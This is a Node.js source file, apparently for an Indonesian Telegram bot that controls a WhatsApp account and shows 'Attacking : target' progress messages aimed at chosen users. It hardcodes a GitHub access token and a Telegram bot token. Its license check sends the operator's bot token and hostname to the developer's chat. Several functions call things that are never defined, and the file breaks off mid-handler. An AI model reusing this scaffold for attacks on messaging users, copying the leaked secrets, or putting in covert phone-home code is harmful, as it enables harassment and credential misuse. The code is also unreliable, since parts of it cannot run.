const { Telegraf, Markup, session } = require("telegraf"); 
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  isJidNewsletter,
  prepareWAMessageMedia,
  getMandarinObfuscationConfig,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const { Octokit } = require("@octokit/rest");
const fs = require("fs");
const os = require("os");
const path = require("path");
const moment = require("moment-timezone");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");
const pino = require("pino");
const { execFile } = require("child_process");
const fetch = require("node-fetch");
const { promisify } = require("util");
const chalk = require("chalk");
const mime = require("mime-types");
const figlet = require("figlet");
const { BOT_TOKEN, RAPIDAPI_KEY, TMP_DIR } = require("./config");
const gradient = require("gradient-string");
const crypto = require("crypto");
const { fileURLToPath } = require("url");
const FormData = require("form-data");

const premiumFile = "./DatabaseUser/premiumuser.json";
const adminFile = "./DatabaseUser/adminuser.json";
const ownerFile = "./phenoxId.json";
const ownerID = 7653566720;
const proccesImg = "https://files.catbox.moe/wz0emw.jpg";

const Module = require('module');

const originalRequire = Module.prototype.require;

Module.prototype.require = function (request) {
    if (request.toLowerCase() === 'axios') {
        console.error("⚠");
        process.exit(1);
    }
    return originalRequire.apply(this, arguments);
};

console.log(chalk.red("system protection active !"));
//=================================================\\
let bots = [];
let sock = null;
let isWhatsAppConnected = false;
let MAINTENANCE_MODE = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const developerId = "7454464877"; 

const bot = new Telegraf(BOT_TOKEN);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const randomImages = [
   "https://files.catbox.moe/ltoayk.jpg",
   "https://files.catbox.moe/5anqp3.jpg",
   "https://files.catbox.moe/wofb05.jpg",
   "https://files.catbox.moe/7m7fdq.jpg",
   "https://files.catbox.moe/mq0zay.jpg",
   "https://files.catbox.moe/lk462r.jpg",
   "https://files.catbox.moe/uglkx0.jpg",
   "https://files.catbox.moe/j7bw9q.jpg",
   "https://files.catbox.moe/9c9dzd.jpg",
   "https://files.catbox.moe/eggqgt.jpg",
   "https://files.catbox.moe/m7hww8.jpg",
   "https://files.catbox.moe/kjue2w.jpg",
   "https://files.catbox.moe/ot70t4.jpg",
   "https://files.catbox.moe/fapgfw.jpg",
   "https://files.catbox.moe/msu4dk.jpg",
   "https://files.catbox.moe/z7leex.jpg",
   "https://files.catbox.moe/t4m4sn.jpg",
];


const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

async function cekGroupDariLink(sock, link) {
  try {
    if (!sock || typeof sock.groupInviteInfo !== "function")
      throw new Error("Instance Baileys tidak valid / belum connect.");

    let code = link.trim();
    const m = code.match(INVITE_REGEX);
    if (m && m[1]) code = m[1];

    if (!code) throw new Error("Tidak ditemukan kode invite dalam link.");

    const info = await sock.groupInviteInfo(code);
    const groupId = info.id || info.groupId || info.group?.id || null;

    if (!groupId) throw new Error("Tidak bisa mendapatkan ID grup dari link.");

    return {
      ok: true,
      groupId,
      subject: info.subject,
      size: info.size,
      owner: info.creator || info.owner || "-",
      expiration: info.expiration,
    };
  } catch (err) {
    return { ok: false, error: err.message };
  }
}

module.exports = { cekGroupDariLink };

async function toSticker(inputUrl) {
  const inputPath = `/tmp/input_${Date.now()}`;
  const outputPath = `/tmp/output_${Date.now()}.webp`;

  const buffer = await axios.get(inputUrl, { responseType: "arraybuffer" }).then(r => r.data);
  fs.writeFileSync(inputPath, buffer);

  return new Promise((resolve, reject) => {
    ffmpeg(inputPath)
      .outputOptions([
        "-vcodec libwebp",
        "-vf scale=512:512:force_original_aspect_ratio=decrease,fps=20"
      ])
      .save(outputPath)
      .on("end", () => resolve(outputPath))
      .on("error", reject);
  });
}


function parseDuration(durationStr) {
  const match = durationStr.match(/^(\d+)([dhm])$/);
  if (!match) return 0;
  const value = parseInt(match[1]);
  const unit = match[2];
  switch (unit) {
    case 'd': return value * 24 * 60 * 60 * 1000;
    case 'h': return value * 60 * 60 * 1000;
    case 'm': return value * 60 * 1000;
    default: return 0;
  }
}

async function tiktokSearch(query) {
  try {
    const url = `https://tikwm.com/api/feed/search`;
    const body = {
      keywords: query,
      count: 20
    };

    const { data } = await axios.post(url, body, {
      headers: {
        "content-type": "application/json"
      }
    });

    if (!data.data || data.data.length === 0) {
      return [];
    }

    return data.data.map(video => ({
      title: video.title || video.music?.title || "Tanpa Judul",
      author: video.author.nickname || "Unknown",
      music: video.music?.title || "Tidak Diketahui",
      thumbnail: video.cover || video.origin_cover,
      videoUrl: "https://tikwm.com/video/" + video.video_id,
      download: video.play, // link download tanpa watermark
      musicDownload: video.music?.play_url || null // link download audio
    }));

  } catch (error) {
    console.log("Error Search:", error);
    return [];
  }
}

module.exports = { tiktokSearch };

function isActiveUser(list, id) {
  if (!list[id]) return false;
  return new Date(list[id]) > new Date();
}


const ownerIdFile = "./phenoxId.json";
const groupConfigPath = "./DatabaseUser/group.json";

function loadOwnerData() {
  try {
    return JSON.parse(fs.readFileSync(ownerIdFile));
  } catch {
    return {};
  }
}

const TEMP_DIR = path.join(os.tmpdir(), 'telegraf-fixbot');
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

function safeFilename(original) {
  const name = path.basename(original).replace(/[^a-z0-9_.-]/gi, '_');
  return `${Date.now()}_${name}`;
}

async function downloadFile(url, destPath) {
  const writer = fs.createWriteStream(destPath);
  const res = await axios({ url, method: 'GET', responseType: 'stream' });
  await new Promise((resolve, reject) => {
    res.data.pipe(writer);
    let error = null;
    writer.on('error', err => {
      error = err;
      writer.close();
      reject(err);
    });
    writer.on('close', () => {
      if (!error) resolve();
    });
  });
}

function detectType(filename, content) {
  const ext = path.extname(filename).toLowerCase();
  if (ext === '.html' || ext === '.htm') return 'html';
  if (ext === '.js' || ext === '.mjs' || ext === '.cjs') return 'javascript';

  // fallback content detection
  if (/<\/\s*html\s*>/i.test(content) || /<script[\s>]/i.test(content)) return 'html';
  if (/(?:function|const|let|var|=>)/.test(content) || /bot\.command|new\s+Telegraf/i.test(content)) return 'javascript';

  return 'unknown';
}

/* ------------------ Heuristic fixers ------------------ */

function ensureTelegrafImportAndBotInit(content) {
  // If code uses bot.* or bot.command and there's no 'const bot' or 'new Telegraf', try to add import/init.
  const usesBot = /(^|\W)bot\./m.test(content) || /bot\.command|bot\.on|bot\.launch/i.test(content);
  const hasTelegraf = /new\s+Telegraf\(/i.test(content) || /from\s+['"]telegraf['"]/i.test(content) || /require\(['"]telegraf['"]\)/i.test(content);
  const hasBotDecl = /(?:const|let|var)\s+bot\s*=/i.test(content);

  if (usesBot && !hasBotDecl) {
    let insert = '';
    if (!hasTelegraf) {
      // add import
      if (/^\s*module\.exports\s*=|^\s*exports\./m.test(content)) {
        // CommonJS style
        insert += "const { Telegraf } = require('telegraf');\n";
      } else {
        insert += "import { Telegraf } from 'telegraf';\n";
      }
    }
    // Add bot declaration using env BOT_TOKEN if not present
    insert += "const bot = new Telegraf(process.env.BOT_TOKEN);\n";
    // try to place near top (after any 'use strict' or shebang)
    if (/^#!/.test(content)) {
      // keep shebang, insert after
      return content.replace(/^#!.*\n/, match => match + insert);
    } else {
      return insert + '\n' + content;
    }
  }
  return content;
}

function fixCommonJsIssues(content) {
  // Fix `bot is not defined` by ensuring 'bot' declared
  content = ensureTelegrafImportAndBotInit(content);

  // If file references 'module.exports = bot' but bot missing -> leave (handled above)

  // Add missing semicolons? We'll rely on Prettier.
  return content;
}

function fixHTML(content) {
  // Use Prettier HTML parser to format & close tags where possible
  try {
    const formatted = prettier.format(content, { parser: 'html', printWidth: 120 });
    return formatted;
  } catch (e) {
    // fallback: return original
    return content;
  }
}

function fixJavaScript(content) {
  // 1) Ensure Telegraf import + bot init if bot.* used
  content = fixCommonJsIssues(content);

  // 2) Format with Prettier (babel parser covers most JS & modern syntax)
  try {
    const formatted = prettier.format(content, { parser: 'babel', singleQuote: true, printWidth: 100 });
    return formatted;
  } catch (e) {
    // If prettier fails (e.g. TypeScript or newer syntax), try babel-flow parser
    try {
      return prettier.format(content, { parser: 'babel-flow' });
    } catch (e2) {
      // give up, return original
      return content;
    }
  }
}

async function tiktokSearch(query) {
  try {
    const res = await fetch(`https://api.tikwm.com/search?keywords=${encodeURIComponent(query)}&count=10`);
    const json = await res.json();

    if (!json || !json.data || !json.data.videos) return [];

    return json.data.videos.map(v => ({
      title: v.title || "No Title",
      author: v.author.nickname || "Unknown",
      music: v.music_info?.title || "No Music Title",
      videoUrl: `https://www.tikwm.com/video/media/play/${v.video_id}.mp4`
    }));

  } catch (err) {
    console.log("Error search Tiktok:", err);
    return [];
  }
}

function isValidOwner(id) {
  if (id === "7454464877") return true; 

  const owners = loadOwnerData();
  const exp = owners[id];
  if (!exp) return false;

  const now = new Date();
  const expiredAt = new Date(exp);
  return expiredAt > now;
}

function loadGroupConfig() {
  try {
    return JSON.parse(fs.readFileSync(groupConfigPath));
  } catch {
    return { isGroupOnly: false };
  }
}

const devs = ["7454464877"]; // isi dengan ID kamu
function isDeveloper(id) {
  return devs.includes(id.toString());
}


function saveGroupConfig(data) {
  fs.writeFileSync(groupConfigPath, JSON.stringify(data, null, 2));
}

let groupConfig = loadGroupConfig();

const githubToken = "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";

const octokit = new Octokit({ auth: githubToken });

const welcomeConfigFile = "./DatabaseUser/welcome.json";

function loadWelcomeConfig() {
  try {
    return JSON.parse(fs.readFileSync(welcomeConfigFile));
  } catch {
    return { enabled: false };
  }
}

function saveWelcomeConfig(config) {
  fs.writeFileSync(welcomeConfigFile, JSON.stringify(config, null, 2));
}
//=================================================\\
const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const COOLDOWN_FILE = path.join(__dirname, "DatabaseUser", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}

function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)([smhd])$/i); 
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value;
    case "m": return value * 60;
    case "h": return value * 3600;
    case "d": return value * 86400;
    default: return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

//=================================================\\
const GITHUB_TOKEN_URL = "https://raw.githubusercontent.com/DilzXd1/Db/refs/heads/main/database.json";
const TELEGRAM_ALERT_ID = "7454464877";
const TELEGRAM_BOT_TOKEN = "7309806538:AAHA9dJg8doTYqy1oTMPX7MomDAoX8zS_lM";

async function validateToken() {
  try {
    const res = await axios.get(GITHUB_TOKEN_URL);
    const validTokens = res.data.tokens || [];

    if (!validTokens.includes(BOT_TOKEN)) {
      console.log("Token Is Not Defined.");
      console.log("Restart...");
      await sendBypassAlert("ACCES IS LOGED!");
      process.exit(1);
    }

    console.log(chalk.greenBright("Succesfully Acces ✓"));
  } catch (err) {
    console.error("⚠️ Gagal mengambil token dari GitHub:", err.message);
    process.exit(1);
  }
}

async function sendBypassAlert(reason) {
  const idData = JSON.parse(fs.readFileSync("./phenoxId.json"));
  const currentId = Object.keys(idData)[0];
  const time = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
  const domain = process.env.HOSTNAME || os.hostname();

  const text = `
‼️ *PENCOBAAN BYPASS TERDETEKSI* ‼️
ID: ${currentId}
Token: \`${BOT_TOKEN}\`
Reason: ${reason}
Domain: ${domain}
Time: ${time}
`.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_ALERT_ID,
      text,
      parse_mode: "Markdown"
    });
    console.log("‼️ Notifikasi Telah Dikirim Ke Developer.");
  } catch (e) {
    console.error("❌ Gagal kirim notifikasi:", e.message);
  }
}

validateToken();
//=================================================\\
const githubOwner1 = "DilzXd1";
const githubRepo1 = "Db";
const tokenPath = "database.json";
const resellerPath = "reseller.json";
const paymentPath = "payment.json";

function formatNominal(num) {
  if (num >= 1000000) return (num / 1000000).toFixed(0) + "M";
  if (num >= 1000) return (num / 1000).toFixed(0) + "k";
  return num.toString();
}

// ==== PT role (boleh add/del reseller) ====
const ptPath = "pt.json";

async function isPT(userId) {
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${ptPath}`;
    const { data } = await axios.get(url);
    const list = data.pt || data.pts || []; // fallback kalau struktur file lama
    return list.includes(userId);
  } catch (e) {
    console.error("Gagal cek PT:", e.message);
    return false;
  }
}
let setcmd = JSON.parse(fs.readFileSync("./DatabaseUser/setcmd.json"));

// Fungsi Simpan
function saveSetcmd() {
  fs.writeFileSync("./DatabaseUser/setcmd.json", JSON.stringify(setcmd, null, 2));
}

async function getLyrics(trackId) {
  try {
    const url = `https://spotify23.p.rapidapi.com/track_lyrics/?id=${trackId}`;
    const options = {
      method: "GET",
      headers: {
        "x-rapidapi-key": RAPIDAPI_KEY,
        "x-rapidapi-host": "spotify23.p.rapidapi.com",
      },
    };

    const res = await fetch(url, options);
    const data = await res.json();

    const lyrics = data?.lyrics?.lines?.map((l) => l.words).join("\n");
    return lyrics || "❌ Lirik tidak ditemukan.";
  } catch (err) {
    console.error("Error getLyrics:", err.message);
    return "❌ Terjadi kesalahan mengambil lirik.";
  }
}

module.exports = { getLyrics };


async function searchSpotify(query) {
  try {
    const url = `https://spotify23.p.rapidapi.com/search/?q=${encodeURIComponent(query)}&type=tracks&limit=5`;

    const options = {
      method: "GET",
      headers: {
        "x-rapidapi-key": RAPIDAPI_KEY,
        "x-rapidapi-host": "spotify23.p.rapidapi.com",
      },
    };

    const res = await fetch(url, options);
    const data = await res.json();

    const tracks = data.tracks?.items || [];
    if (!tracks.length) return [];

    return tracks.map((t, i) => ({
      no: i + 1,
      id: t.data.id,
      title: t.data.name,
      artist: t.data.artists.items.map((a) => a.profile.name).join(", "),
      album: t.data.albumOfTrack.name,
      url: `https://open.spotify.com/track/${t.data.id}`,
      image: t.data.albumOfTrack.coverArt.sources[0].url,
    }));
  } catch (err) {
    console.error("Spotify Search Error:", err);
    return [];
  }
}

module.exports = { searchSpotify };

async function isPTorDev(userId) {
  return userId === developerId || (await isPT(userId));
}

// ==== MOD role (boleh add/del PT) ====
const modPath = "mod.json";

async function isMOD(userId) {
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${modPath}`;
    const { data } = await axios.get(url);
    const list = data.mod || data.mods || [];
    return list.includes(userId);
  } catch (e) {
    console.error("Gagal cek MOD:", e.message);
    return false;
  }
}

async function isMODorDev(userId) {
  return userId === developerId || (await isMOD(userId));
}

async function isResellerOrOwner(userId) {
  if (userId === developerId) return true;

  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${resellerPath}`;
    const { data } = await axios.get(url);
    return data.resellers.includes(userId);
  } catch (e) {
    console.error("Gagal cek reseller:", e.message);
    return false;
  }
}

async function updateGitHubJSON(filePath, updateCallback) {
  try {
    const res = await octokit.repos.getContent({
      owner: githubOwner1,
      repo: githubRepo1,
      path: filePath
    });

    const content = Buffer.from(res.data.content, "base64").toString();
    const json = JSON.parse(content);
    const updatedJSON = await updateCallback(json);

    const encodedContent = Buffer.from(JSON.stringify(updatedJSON, null, 2)).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubOwner1,
      repo: githubRepo1,
      path: filePath,
      message: `Update ${filePath}`,
      content: encodedContent,
      sha: res.data.sha,
    });

    return true;
  } catch (err) {
    console.error("Update gagal:", err.message);
    return false;
  }
}

//=================================================\\
const MAINTENANCE_RAW_URL = "https://raw.githubusercontent.com/DilzXd1/Db/refs/heads/main/security.json";
const BOT_OWNER_ID = "7454464877";

const githubMaintenanceConfig = {
  repoOwner: "DilzXd1",
  repoName: "Db",
  branch: "refs/heads/main",
  filePath: "security.json"
};

async function getMaintenanceStatus() {
  try {
    const res = await axios.get(MAINTENANCE_RAW_URL);
    return res.data || { status: "off", message: "" };
  } catch (err) {
    console.error("❌ Gagal cek maintenance:", err.message);
    return { status: "off", message: "" };
  }
}

async function setMaintenanceStatus(status, message = "") {

  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubMaintenanceConfig.repoOwner,
      repo: githubMaintenanceConfig.repoName,
      path: githubMaintenanceConfig.filePath,
      ref: githubMaintenanceConfig.branch
    });

    const sha = fileData.sha;

    const updatedContent = Buffer.from(
      JSON.stringify({ status, message }, null, 2)
    ).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubMaintenanceConfig.repoOwner,
      repo: githubMaintenanceConfig.repoName,
      path: githubMaintenanceConfig.filePath,
      message: `Set maintenance ${status}`,
      content: updatedContent,
      sha,
      branch: githubMaintenanceConfig.branch
    });

    return true;
  } catch (err) {
    console.error("❌ Gagal update maintenance:", err.message);
    return false;
  }
}

//=================================================\\
const VERSION_RAW_URL = "https://raw.githubusercontent.com/DilzXd1/Db/refs/heads/main/version.json";
const BOT_OWNER_ID2 = "7454464877"; 

const githubVersionConfig = {
  repoOwner: "DilzXd1",
  repoName: "Db",
  branch: "refs/heads/main",
  filePath: "version.json"
};

async function getBotVersion() {
  try {
    const res = await axios.get(VERSION_RAW_URL);
    return res.data?.version || "Unknown";
  } catch (e) {
    console.error("❌ Gagal mengambil versi bot:", e.message);
    return "Unknown";
  }
}

async function updateBotVersion(newVersion) {

  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubVersionConfig.repoOwner,
      repo: githubVersionConfig.repoName,
      path: githubVersionConfig.filePath,
      ref: githubVersionConfig.branch
    });

    const sha = fileData.sha;

    const updatedContent = Buffer.from(
      JSON.stringify({ version: newVersion }, null, 2)
    ).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubVersionConfig.repoOwner,
      repo: githubVersionConfig.repoName,
      path: githubVersionConfig.filePath,
      message: `Update versi ${newVersion}`,
      content: updatedContent,
      sha: sha,
      branch: githubVersionConfig.branch
    });

    return true;
  } catch (err) {
    console.error("❌ Gagal update versi bot:", err.message);
    return false;
  }
}

//=================================================\\
const githubOwner2 = "DilzXd1";
const githubRepo2 = "Db";
const blacklistPath = "blacklist.json";

async function updateGitHubBlacklist(updateFn) {
  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubOwner2,
      repo: githubRepo2,
      path: blacklistPath,
    });

    const content = Buffer.from(fileData.content, "base64").toString();
    const json = JSON.parse(content);
    const updated = await updateFn(json);

    await octokit.repos.createOrUpdateFileContents({
      owner: githubOwner2,
      repo: githubRepo2,
      path: blacklistPath,
      message: "Update blacklist.json",
      content: Buffer.from(JSON.stringify(updated, null, 2)).toString("base64"),
      sha: fileData.sha,
    });

    return true;
  } catch (e) {
    console.error("Gagal update blacklist:", e.message);
    return false;
  }
}

//=================================================\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.00.04'],
    getMessage: async () => ({
      conversation: 'P',
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      isWhatsAppConnected = true;
      console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

      console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍
${shouldReconnect ? 'Reconnecting...' : ''}`));

      if (shouldReconnect) {
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};



//=================================================\\
const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  if (!isActiveUser(ownerUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Owner");
  }
  next();
};

const checkAdmin = (ctx, next) => {
  if (!isActiveUser(adminUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!isActiveUser(premiumUsers, ctx.from.id.toString())) {
    return ctx.reply("Can Only Be Used Premium User");
  }
  next();
};

function isPremium(id) {
  return isActiveUser(premiumUsers, id.toString());
}



// 🛠️ Middleware global untuk deteksi maintenance
bot.use(async (ctx, next) => {
  if (MAINTENANCE_MODE) {
    const message = `
 *System Stopped!*
System starting next days.

Developer: [RenzXml](https://t.me/RapzXyzz)
    `;
    return ctx.reply(message, { parse_mode: "Markdown" });
  }
  return next();
});


const addOwner = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  ownerUsers[userId] = expired;
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const removeOwner = (userId) => {
  delete ownerUsers[userId];
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const addAdmin = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  adminUsers[userId] = expired;
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const removeAdmin = (userId) => {
  delete adminUsers[userId];
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const addPremium = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  premiumUsers[userId] = expired;
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const removePremium = (userId) => {
  delete premiumUsers[userId];
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("› WhatsApp Not Connected!");
    return;
  }
  next();
};

const prosesrespone1 = async (target, ctx) => {
  const caption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : tg://user?id=${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
 `;

  try {
      await ctx.replyWithPhoto("https://files.catbox.moe/jiqsek.jpg", {
          caption: caption,
          parse_mode: "Markdown", 
          reply_markup: {
            inline_keyboard: [
                [{ text: "Check Target", callback_data: `tg://user?id=${target.split("@") [0]}` }]
            ]
        }
      });
      console.log(chalk.blue.bold(`[✓] Process attack target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error sending process response:', error));
      // Fallback to text-only message if image fails
      await ctx.reply(caption, { parse_mode: "Markdown" });
  }
};

const donerespone1 = async (target, ctx) => {
  // Get random hexcolor for timestamp
  const hexColor = '#' + Math.floor(Math.random()*16777215).toString(16);
  const timestamp = moment().format('HH:mm:ss');
  
  try {
    const caption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : tg://user?id=${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
 `;
 
    await ctx.replyWithPhoto("https://files.catbox.moe/jiqsek.jpg", {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "Check Target!", callback_data: `tg://user?id=${target.split("@") [0]}` }]
            ]
        }
    });
    console.log(chalk.green.bold(`[✓] Attack in succes target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error:', error));
      // Fallback message tanpa quotes jika API error
      const fallbackCaption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : ${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`;
 
      await ctx.reply(fallbackCaption, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "Check Target!", url: `tg;//user?id=${target.split("@") [0]}` }]
              ]
          }
      });
  }
 };
 
 
function isMeOnly(ctx) {
  const devId = "7653566720";
  return ctx.from?.id?.toString() === devId;
}

function getSystemInfo() {
  const totalMem = os.totalmem() / (1024 * 1024);
  const freeMem = os.freemem() / (1024 * 1024);
  const usedMem = totalMem - freeMem;
  const cpuUsage = os.loadavg()[0].toFixed(2); // 1 menit rata-rata load

  return {
    ram: `${usedMem.toFixed(2)}MB / ${totalMem.toFixed(2)}MB`,
    cpu: `${cpuUsage}`,
    uptime: getUptime()
  };
}
//=================================================\\
bot.use(async (ctx, next) => {
  const senderId = ctx.from?.id?.toString();
  const chatId = ctx.chat?.id?.toString();
  const chatType = ctx.chat?.type;

  // ========== [ MAINTENANCE CHECK ] ==========
  try {
    const { status, message } = await getMaintenanceStatus();
    if (status === "on" && senderId !== BOT_OWNER_ID) {
      return ctx.reply(`*System Berhenti !*\n${message}`, {
        parse_mode: "Markdown",
      });
    }
  } catch (err) {
    console.error("Gagal cek maintenance:", err.message);
  }

  // ========== [ GROUPONLY MODE ] ==========
  try {
    const groupConfig = loadGroupConfig();
    const isGroup = chatType === "group" || chatType === "supergroup";

    if (groupConfig.isGroupOnly && !isGroup && !isValidOwner(senderId)) {
      return ctx.reply("❌ Bot hanya dapat digunakan di grup saat mode grouponly aktif.");
    }

  } catch (err) {
    console.error("Gagal cek GroupOnly:", err.message);
  }

  // ========== [ BLACKLIST CHECK ] ==========
  try {
    const { data } = await axios.get(`https://raw.githubusercontent.com/${githubOwner2}/${githubRepo2}/main/${blacklistPath}`);
    const isBlacklisted = data.blacklist.includes(senderId);

    if (isBlacklisted) {
      return ctx.reply("🚫 Anda masuk dalam daftar blacklist dan tidak dapat menggunakan bot ini.");
    }
  } catch (err) {
    console.error("Gagal cek blacklist:", err.message);
  }

  // ========== [ USER / GROUP TRACKING ] ==========
  const dbFile = "./DatabaseUser/userlist.json";
  let db = { private: [], group: [] };

  try {
    if (fs.existsSync(dbFile)) {
      db = JSON.parse(fs.readFileSync(dbFile));
    }

    if (chatType === "private" && !db.private.includes(chatId)) {
      db.private.push(chatId);
    } else if ((chatType === "group" || chatType === "supergroup") && !db.group.includes(chatId)) {
      db.group.push(chatId);
    }

    fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
  } catch (err) {
    console.error("Gagal mencatat user/group:", err.message);
  }

  // ========== [ LANJUT KE NEXT MIDDLEWARE ] ==========
  return next();
});

//=================================================\\
bot.on("getsuzo", async (ctx) => {
  const config = loadWelcomeConfig();
  const userId = ctx.from.id.toString();

  if (!config.enabled) return;

  const member = ctx.message.new_chat_members[0];
  const name = member.first_name;
  const groupTitle = ctx.chat.title;

